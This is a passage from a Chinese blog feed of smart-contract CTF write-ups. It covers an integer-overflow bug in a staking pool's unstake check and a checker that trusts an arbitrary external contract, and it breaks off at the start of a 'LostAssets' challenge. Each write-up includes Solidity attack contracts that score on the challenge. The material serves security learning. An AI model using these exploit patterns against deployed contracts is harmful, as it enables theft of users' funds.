&quot;cuit&quot;;</span><br><span class="line">        totalsupply = token.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getDetails(address account)public view returns(userInfo memory)&#123;</span><br><span class="line">        return userDetails[account];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function workBalanceOf(address account)public view returns(uint)&#123;</span><br><span class="line">        bool pass=passed[account];</span><br><span class="line">        if(pass)&#123;</span><br><span class="line">            return workbalance[account];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Zt()public view returns(address)&#123;</span><br><span class="line">        return address(token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stake(uint amount,uint blocknumber)external returns(uint256)&#123;</span><br><span class="line">        require(blocknumber&gt;=1,&quot;At least 1 block&quot;);</span><br><span class="line"></span><br><span class="line">        userInfo storage user = userDetails[msg.sender];</span><br><span class="line"></span><br><span class="line">        user.startTime = block.number;</span><br><span class="line">        user.duration = blocknumber;</span><br><span class="line">        user.amount += amount;</span><br><span class="line">        passed[msg.sender] = false;</span><br><span class="line"></span><br><span class="line">        token.transferFrom(msg.sender,address(this),amount*10**18);</span><br><span class="line">        workbalance[msg.sender] += blocknumber;</span><br><span class="line">        //return block.number;  目前43</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function unstake()external&#123;</span><br><span class="line">        userInfo storage user = userDetails[msg.sender];</span><br><span class="line">        require(block.number&gt;=user.startTime+user.duration,&quot;you are in a hurry &quot;);//整数溢出</span><br><span class="line">        passed[msg.sender] = true;</span><br><span class="line">        uint amount = user.amount;</span><br><span class="line">        user.amount = 0;</span><br><span class="line">        token.transfer(msg.sender,amount*10**18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function swap(uint amount)external&#123;</span><br><span class="line">        uint balance = workBalanceOf(msg.sender);</span><br><span class="line">        require(balance&gt;=amount,&quot;exceed&quot;);</span><br><span class="line">        workbalance[msg.sender] -= amount;</span><br><span class="line">        token.transfer(msg.sender,amount*10**18);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract check is stakepool&#123;</span><br><span class="line">    uint256 public score;</span><br><span class="line">    function isCompleted()public&#123;</span><br><span class="line">        score=0;</span><br><span class="line">        if (getDetails(msg.sender).amount&gt;5000000 ether)&#123;</span><br><span class="line">            score+=25;</span><br><span class="line">        &#125;</span><br><span class="line">        if (token.balanceOf(msg.sender)&gt;500000 ether)&#123;</span><br><span class="line">            score+=75;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>代码量庞大，让我们来理顺一下各个合约是干什么的</p><ul><li>Library SafeMath：一个安全数学运算库</li><li>ERC20：代币合约标准，出题一般不会在这做手脚的</li><li>ZT：是一种ERC20代币</li><li>stakePool：质押合约，本题的重点</li><li>check：检验是否完成题目</li></ul><p>这道题是让我们质押一定的金额，然后到了质押时间之后，可以拿回本金，再通过swap函数获得利息，质押时间就是利息金额。需要通过下面的两个条件：getDetails()说明我们需要在合约中质押大于5000000 ether才可以得到25分，balanceOf()说明我们需要得到500000 ether</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (getDetails(msg.sender).amount&gt;5000000 ether)&#123;</span><br><span class="line">    score+=25;</span><br><span class="line">&#125;</span><br><span class="line">if (token.balanceOf(msg.sender)&gt;500000 ether)&#123;</span><br><span class="line">    score+=75;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看编译器版本小于0.8.0，并且质押完成取钱的函数中，require()并没有用安全运算库中的方法，因此它满足了溢出的条件。假如我们设置质押时间很大，使得<code>user.startTime+user.duration</code>溢出，那么block.number就大于它了，我们就不需要等这么长时间，马上就可以完成质押取钱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function unstake()external&#123;</span><br><span class="line">    userInfo storage user = userDetails[msg.sender];</span><br><span class="line">    require(block.number&gt;=user.startTime+user.duration,&quot;you are in a hurry &quot;);//整数溢出</span><br><span class="line">    passed[msg.sender] = true;</span><br><span class="line">    uint amount = user.amount;</span><br><span class="line">    user.amount = 0;</span><br><span class="line">    token.transfer(msg.sender,amount*10**18);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>swap函数是获取利息函数，它需要从workBalanceOf()函数获得可以获得的利息金额。然而workBalanceOf()函数必须要质押结束之后才可以返回质押金额，否则返回0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function swap(uint amount)external&#123;</span><br><span class="line">    uint balance = workBalanceOf(msg.sender);</span><br><span class="line">    require(balance&gt;=amount,&quot;exceed&quot;);</span><br><span class="line">    workbalance[msg.sender] -= amount;</span><br><span class="line">    token.transfer(msg.sender,amount*10**18);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function workBalanceOf(address account)public view returns(uint)&#123;</span><br><span class="line">    bool pass=passed[account];</span><br><span class="line">    if(pass)&#123;</span><br><span class="line">        return workbalance[account];</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getDetails方法是获得用户质押的结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function getDetails(address account)public view returns(userInfo memory)&#123;</span><br><span class="line">    return userDetails[account];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的攻击思路：</p><ol><li>调用stake：质押0元，质押日期设置为(2^256)-1。保证溢出，并且质押金额非常大，获利非常大</li><li>调用unstake：因为溢出，通过检测，拿回本金0元</li><li>调用swap：获得利息(2^256)-1。到了这一步，就完成了75分</li><li>调用approve：授权给给check一定数量的token代币</li><li>调用stake：质押金额</li></ol><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">//figure函数算出让amount发生溢出的值，达成第一个条件</span><br><span class="line">//fig1函数计算让blocknumber发生溢出的值，达成第二个条件</span><br><span class="line">contract attack&#123;</span><br><span class="line">    check che;</span><br><span class="line">    constructor(address _che)public&#123;</span><br><span class="line">        che = check(_che);</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 max = 2**256-1;</span><br><span class="line">    uint256 eth = 10**18;</span><br><span class="line">    function figure()public view returns(uint256)&#123;</span><br><span class="line">        return (max/eth)+1;</span><br><span class="line">    &#125;</span><br><span class="line">    function fig1()public pure returns(uint256)&#123;</span><br><span class="line">        return 2**256-1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack()public&#123;</span><br><span class="line">        che.stake(0,fig1());</span><br><span class="line">        che.unstake();</span><br><span class="line">        che.swap(600000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack2()public&#123;</span><br><span class="line">    </span><br><span class="line">        che.token().approve(address(che),10000000000 ether);</span><br><span class="line">        che.stake(figure(),fig1());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function complete()public&#123;</span><br><span class="line">        che.isCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>这道题跟我之前遇到的那道题如出一辙，只是改动了一点点东西。考核的时候，看到如此庞大的代码量就麻木和紧张了，分析思路都乱了，今晚再看这道题，没有压力，思路清晰多了，看整个题目也知道他在干什么业务。</p><p>考场的情况，就是紧张，没有理清思路。以后不管什么场合，都应该冷静下来，无论代码量多还是少，都要先整体分析整个业务是干什么的，然后再到每个合约是干什么的，有个宏观的把握。接着就要分析重点的合约，根据业务流程，逐步分析每个方法是干什么的，他们之间有什么联系。当明白了每个方法之间的调用关系和业务流程之后，我们就可以找漏洞了：逻辑调用漏洞，代码写的有问题，等等</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>39.缺少联系合约</title>
      <link href="/2023/06/23/00.security/39.%E7%BC%BA%E5%B0%91%E8%81%94%E7%B3%BB%E5%90%88%E7%BA%A6/"/>
      <url>/2023/06/23/00.security/39.%E7%BC%BA%E5%B0%91%E8%81%94%E7%B3%BB%E5%90%88%E7%BA%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="缺少联系合约"><a href="#缺少联系合约" class="headerlink" title="缺少联系合约"></a>缺少联系合约</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：check合约获得100分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">//SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract tokenbank&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping(address =&gt; uint256) private balance;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner)&#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">        balance[owner] += 1000 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        require(msg.sender==owner,&quot;onlyowner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit()public payable&#123;</span><br><span class="line">        require(msg.value &gt; 0,&quot;are you kidding me?&quot;);</span><br><span class="line">        balance[msg.sender]+=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount)public payable&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        balance[msg.sender]-=amount;</span><br><span class="line">        payable(msg.sender).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _addr,uint256 amount)public&#123;</span><br><span class="line">        require(balance[msg.sender]&gt;=amount);</span><br><span class="line">        require(msg.sender!=_addr);</span><br><span class="line">        balance[msg.sender]-=amount;</span><br><span class="line">        balance[_addr]+=amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _addr)public view returns(uint256)&#123;</span><br><span class="line">        return balance[_addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _addr,uint256 amount)public onlyOwner&#123;</span><br><span class="line">        balance[_addr]+=amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address _addr,uint256 amount)public onlyOwner&#123;</span><br><span class="line">        balance[_addr]-=amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract check&#123;</span><br><span class="line">    uint256 public score;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">       tokenbank bank = tokenbank(address(this));//?????</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isCompleted(address _bank)public&#123;</span><br><span class="line">        score=0;</span><br><span class="line"></span><br><span class="line">        if(tokenbank(_bank).balanceOf(address(this))==0)&#123;</span><br><span class="line">            score+=25;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(tokenbank(_bank).owner()==address(this) &amp;&amp; tokenbank(_bank).balanceOf(msg.sender) &gt;= 10000 ether)&#123;</span><br><span class="line">            score+=75;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>考点：可控地址的外部合约调用</p><p>代码量比较少，check合约的isComplete()方法，会调用一个外部地址的balanceOf方法和owner()方法，但是它并没有任何限定性条件说是tokenbank合约。这就体现了check的外部合约调用可控，然后我们就可以输入任意合约</p><p>意思是：check合约并没有确定指定的合约，这样的话我们就可以不用题目的，另外写。漏洞是外部不可控合约 ，check合约期望的合约跟实际的不一样</p><p>解题：部署一个和题目差不多一致的合约代码，仅仅在构造器中做一点修改，把1000ETH改成10000ETH，然后部署合约即可</p><h2 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">//SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract tokenbank&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping(address =&gt; uint256) private balance;</span><br><span class="line"></span><br><span class="line">    constructor(address _owner)&#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">        balance[owner] += 1000 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        require(msg.sender==owner,&quot;onlyowner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit()public payable&#123;</span><br><span class="line">        require(msg.value &gt; 0,&quot;are you kidding me?&quot;);</span><br><span class="line">        balance[msg.sender]+=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount)public payable&#123;</span><br><span class="line">        require(balance[msg.sender] &gt;= amount);</span><br><span class="line">        balance[msg.sender]-=amount;</span><br><span class="line">        payable(msg.sender).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _addr,uint256 amount)public&#123;</span><br><span class="line">        require(balance[msg.sender]&gt;=amount);</span><br><span class="line">        require(msg.sender!=_addr);</span><br><span class="line">        balance[msg.sender]-=amount;</span><br><span class="line">        balance[_addr]+=amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address _addr)public view returns(uint256)&#123;</span><br><span class="line">        return balance[_addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _addr,uint256 amount)public onlyOwner&#123;</span><br><span class="line">        balance[_addr]+=amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address _addr,uint256 amount)public onlyOwner&#123;</span><br><span class="line">        balance[_addr]-=amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract check&#123;</span><br><span class="line">    uint256 public score;</span><br><span class="line"></span><br><span class="line">    constructor()&#123;</span><br><span class="line">       tokenbank bank = tokenbank(address(this));//?????</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isCompleted(address _bank)public&#123;</span><br><span class="line">        score=0;</span><br><span class="line"></span><br><span class="line">        if(tokenbank(_bank).balanceOf(address(this))==0)&#123;</span><br><span class="line">            score+=25;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(tokenbank(_bank).owner()==address(this) &amp;&amp; tokenbank(_bank).balanceOf(msg.sender) &gt;= 10000 ether)&#123;</span><br><span class="line">            score+=75;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract tokenbank2&#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    mapping(address =&gt; uint256)private balance;</span><br><span class="line">    constructor(address _owner)&#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">        balance[msg.sender]+=10000 ether;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner&#123;</span><br><span class="line">        require(msg.sender==owner,&quot;onlyowner&quot;);</span><br><span class="line"></span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit()public payable&#123;</span><br><span class="line">        require(msg.value&gt;0,&quot;are you kidding me?&quot;);</span><br><span class="line">        balance[msg.sender]+=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 amount)public payable&#123;</span><br><span class="line">        require(balance[msg.sender]&gt;=amount);</span><br><span class="line">        balance[msg.sender]-=amount;</span><br><span class="line">        payable(msg.sender).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _addr,uint256 amount)public&#123;</span><br><span class="line">        require(balance[msg.sender]&gt;=amount);</span><br><span class="line">        require(msg.sender!=_addr);</span><br><span class="line">        balance[msg.sender]-=amount;</span><br><span class="line">        balance[_addr]+=amount;</span><br><span class="line">    &#125;</span><br><span class="line">    function balanceOf(address _addr)public view returns(uint256)&#123;</span><br><span class="line">        return balance[_addr];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address _addr,uint256 amount)public onlyOwner&#123;</span><br><span class="line">        balance[_addr]+=amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address _addr,uint256 amount)public onlyOwner&#123;</span><br><span class="line">        balance[_addr]-=amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferOwnership(address _addr)public onlyOwner&#123;</span><br><span class="line">        owner = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attck&#123;</span><br><span class="line">    check to;</span><br><span class="line">    tokenbank2 to2 ;</span><br><span class="line">    constructor(address _tokenbank)public&#123;</span><br><span class="line">        to = check(_tokenbank);</span><br><span class="line">        to2 = new tokenbank2(_tokenbank);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function complete()public&#123;</span><br><span class="line">        to.isCompleted(address(to2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><p>考核的时候，这是第一道题，然而却没有做出来，非常地懊恼！让我来分析一下我当时的思路：</p><ol><li>我一直在想是不是通过owner来mint代币</li><li>然后转移owner身份</li><li>搞不来，就delegatecall和call。也不行，就想构造器中攻击，利用create2提前计算地址来部署</li></ol><p>就一直没想到这个外部合约调用是可控的，之前也没有遇到过这类的题目，从来不知道有这种漏洞，算是学到了全新的东西。所以说，我还是很多东西不会，还需要看很多东西，学习很多</p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>38.LostAssets</title>
      <link href="/2023/06/23/00.security/38.LostAssets/"/>
      <url>/2023/06/23/00.security/38.LostAssets/</url>
      
        <content type="html"><![CDATA[<h1 id="LostAssets"><a href="#LostAssets" class="headerlink" title="LostAssets"></a>LostAssets</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>要求：调用isComplete()返回true</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol&quot;;</span><br><span class="line">import &#123;IERC20Permit, ERC20Permit&#125; from &quot;@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract MockWETH is ERC20(&quot;Wrapped ETH&quot;, &quot;WETH&quot;) &#123;</span><br><span class="line">    event Deposit(address indexed dst, uint256 wad);</span><br><span class="line">    event Withdrawal(address indexed src, uint256 wad);</span><br><span class="line"></span><br><span class="line">    /// @dev Original WETH9 implements `fallback` function instead of `receive` function due to a earlier solidity version</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        deposit();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        _mint(msg.sender, msg.value);</span><br><span class="line">        </span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 wad) public &#123;</span><br><span class="line">        require(balanceOf(msg.sender) &gt;= wad, &quot;weth: insufficient balance&quot;);</span><br><span class="line"></span><br><span class="line">        _burn(msg.sender, wad);</span><br><span class="line">        (bool success, ) = msg.sender.call&#123;value: wad&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;weth: failed&quot;);</span><br><span class="line"></span><br><span class="line">        emit Withdrawal(msg.sender, wad);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/// @notice Token sWETH</span><br><span class="line">contract MocksWETH is ERC20Permit &#123;</span><br><span class="line">    using SafeERC20 for IERC20;</span><br><span class="line"></span><br><span class="line">    address underlying;</span><br><span class="line"></span><br><span class="line">    constructor(address _underlying)</span><br><span class="line">        ERC20(&quot;WrappedERC20&quot;, &quot;WERC20&quot;)</span><br><span class="line">        ERC20Permit(&quot;WrappedERC20&quot;)</span><br><span class="line">    